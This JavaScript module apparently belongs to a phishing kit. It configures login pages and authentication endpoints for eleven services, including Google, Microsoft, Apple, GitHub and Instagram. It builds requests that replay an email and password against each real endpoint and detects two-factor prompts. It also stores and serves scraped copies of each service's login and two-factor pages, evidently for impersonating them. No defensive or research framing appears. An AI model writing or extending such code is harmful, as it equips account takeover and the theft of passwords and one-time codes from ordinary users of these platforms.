import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const SCRAPED_DIR = path.join(__dirname, '..', 'scraped');

export const SERVICES = {
  instagram: {
    name: 'Instagram',
    loginUrl: 'https://www.instagram.com/accounts/login/',
    authEndpoint: 'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
    authMethod: 'POST',
    authHeaders: {
      'X-CSRFToken': 'missing',
      'X-Requested-With': 'XMLHttpRequest',
      'Content-Type': 'application/x-www-form-urlencoded',
    },
    authBody: (email, pass) => `username=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}&queryParams=%7B%7D`,
    checkSuccess: (body) => {
      try {
        const j = JSON.parse(body);
        return j.authenticated === true;
      } catch { return false; }
    },
    twofaUrl: null,
    checkTwofa: (body) => {
      try {
        const j = JSON.parse(body);
        return j.two_factor_required === true;
      } catch { return false; }
    },
    twofaDetect: ['two_factor', 'verification code', 'authenticator'],
  },
  google: {
    name: 'Google',
    loginUrl: 'https://accounts.google.com/v3/signin/identifier?continue=https://www.google.com',
    authEndpoint: 'https://accounts.google.com/_/signin/challenge?hl=en',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `identifier=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}`,
    checkSuccess: (body) => !body.includes('incorrect') && !body.includes('Wrong'),
    twofaUrl: 'https://accounts.google.com/signin/challenge/',
    checkTwofa: (body) => body.includes('challenge') || body.includes('2sv') || body.includes('verification'),
    twofaDetect: ['challenge', '2sv', 'verification code', '2-step', 'two-factor'],
  },
  facebook: {
    name: 'Facebook',
    loginUrl: 'https://www.facebook.com/login/',
    authEndpoint: 'https://www.facebook.com/login.php?login_attempt=1',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `email=${encodeURIComponent(email)}&pass=${encodeURIComponent(pass)}&lwv=110`,
    checkSuccess: (body) => !body.includes('incorrect') && !body.includes('Invalid'),
    twofaUrl: 'https://www.facebook.com/checkpoint/',
    checkTwofa: (body) => body.includes('checkpoint') || body.includes('approvals_code'),
    twofaDetect: ['checkpoint', 'approvals_code', 'two-factor', 'login code'],
  },
  twitter: {
    name: 'Twitter / X',
    loginUrl: 'https://twitter.com/i/flow/login',
    authEndpoint: 'https://api.twitter.com/oauth/access_token',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `session%5Busername_or_email%5D=${encodeURIComponent(email)}&session%5Bpassword%5D=${encodeURIComponent(pass)}`,
    checkSuccess: () => true,
    twofaUrl: null,
    checkTwofa: () => false,
    twofaDetect: ['two-factor', 'verification', 'confirm'],
  },
  linkedin: {
    name: 'LinkedIn',
    loginUrl: 'https://www.linkedin.com/login',
    authEndpoint: 'https://www.linkedin.com/uas/login-submit',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `session_key=${encodeURIComponent(email)}&session_password=${encodeURIComponent(pass)}&loginCsrfParam=&trk=`,
    checkSuccess: (body) => !body.includes('incorrect'),
    twofaUrl: null,
    checkTwofa: () => false,
    twofaDetect: ['two-step', 'verification', 'pin'],
  },
  github: {
    name: 'GitHub',
    loginUrl: 'https://github.com/login',
    authEndpoint: 'https://github.com/session',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `commit=Sign+in&authenticity_token=&login=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}`,
    checkSuccess: (body) => !body.includes('Incorrect'),
    twofaUrl: 'https://github.com/sessions/two-factor',
    checkTwofa: (body) => body.includes('two-factor') || body.includes('otp'),
    twofaDetect: ['two-factor', 'otp', 'authentication code'],
  },
  microsoft: {
    name: 'Microsoft',
    loginUrl: 'https://login.live.com/',
    authEndpoint: 'https://login.live.com/ppsecure/post.srf',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `login=${encodeURIComponent(email)}&passwd=${encodeURIComponent(pass)}&PPFT=&PPSX=Passport&type=11`,
    checkSuccess: (body) => !body.includes('incorrect'),
    twofaUrl: null,
    checkTwofa: (body) => body.includes('mfa') || body.includes('verify'),
    twofaDetect: ['mfa', 'verify', 'authenticator', 'code'],
  },
  apple: {
    name: 'Apple',
    loginUrl: 'https://appleid.apple.com/sign-in',
    authEndpoint: 'https://idmsa.apple.com/appleauth/auth/signin',
    authMethod: 'POST',
    authHeaders: {
      'Content-Type': 'application/json',
      'X-Apple-Widget-Key': '',
      'Accept': 'application/json, text/plain, */*',
    },
    authBody: (email, pass) => JSON.stringify({ accountName: email, password: pass }),
    checkSuccess: () => true,
    twofaUrl: null,
    checkTwofa: (body) => {
      try {
        const j = JSON.parse(body);
        return j.authType === 'hsa2' || (j.error && j.error.includes('verification'));
      } catch { return false; }
    },
    twofaDetect: ['hsa2', 'verification', 'two-factor'],
  },
  netflix: {
    name: 'Netflix',
    loginUrl: 'https://www.netflix.com/login',
    authEndpoint: 'https://www.netflix.com/login',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `userLoginId=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}&countryCode=&rememberMe=true&flow=website`,
    checkSuccess: (body) => !body.includes('incorrect'),
    twofaUrl: null,
    checkTwofa: () => false,
    twofaDetect: ['verification', 'code'],
  },
  tiktok: {
    name: 'TikTok',
    loginUrl: 'https://www.tiktok.com/login',
    authEndpoint: 'https://www.tiktok.com/api/v1/auth/login/',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `username=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}&service=www&type=email`,
    checkSuccess: (body) => {
      try { const j = JSON.parse(body); return j.message === 'success' || !!j.data?.user_id; } catch { return false; }
    },
    twofaUrl: null,
    checkTwofa: (body) => {
      try { const j = JSON.parse(body); return j.data?.two_factor_required === true || j.data?.need_verify === true; } catch { return false; }
    },
    twofaDetect: ['two_factor', 'verification', '2fa', 'verify code'],
  },
  snapchat: {
    name: 'Snapchat',
    loginUrl: 'https://accounts.snapchat.com/accounts/login',
    authEndpoint: 'https://accounts.snapchat.com/accounts/login',
    authMethod: 'POST',
    authHeaders: { 'Content-Type': 'application/x-www-form-urlencoded' },
    authBody: (email, pass) => `username=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}&next=%2F`,
    checkSuccess: (body) => !body.includes('incorrect') && !body.includes('Invalid') && !body.includes('wrong'),
    twofaUrl: null,
    checkTwofa: (body) => body.includes('two-factor') || body.includes('verification') || body.includes('code'),
    twofaDetect: ['two-factor', 'verification', 'code', 'otp', 'authenticator'],
  },
};

export function getService(name) {
  return SERVICES[name];
}

export function listServices() {
  return Object.entries(SERVICES).map(([id, svc]) => ({
    id,
    name: svc.name,
    url: svc.loginUrl,
    scraped: fs.existsSync(path.join(SCRAPED_DIR, id, 'login.html')),
    twofaScraped: fs.existsSync(path.join(SCRAPED_DIR, id, 'twofa.html')),
  }));
}

export function getScrapedPage(service, page = 'login') {
  const filePath = path.join(SCRAPED_DIR, service, `${page}.html`);
  if (fs.existsSync(filePath)) {
    return fs.readFileSync(filePath, 'utf-8');
  }
  return null;
}

export function getScrapedPath(service) {
  return path.join(SCRAPED_DIR, service);
}

export function saveScrapedPage(service, page, html) {
  const dir = path.join(SCRAPED_DIR, service);
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, `${page}.html`), html);
}
